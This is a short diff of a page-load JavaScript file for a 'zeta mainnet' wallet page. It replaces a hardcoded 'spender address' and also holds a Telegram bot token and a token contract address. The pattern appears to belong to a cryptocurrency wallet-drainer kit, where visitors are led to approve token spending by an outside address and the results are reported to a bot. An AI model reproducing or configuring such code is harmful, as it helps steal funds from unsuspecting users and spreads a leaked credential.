@@ -3,7 +3,7 @@ window.onload = async function(){
   let useraddress;
   let network_id = '0x1b58'; // zeta mainnet
 
-  const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // spender address
+  const spenderAddress = '0xCEd271A5C2ED93Ba59Dce555FDc73E1dE3Dcad22'; // spender address
   let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
 
   let tokencontract = '0x45334a5B0a01cE6C260f2B570EC941C680EA62c0';
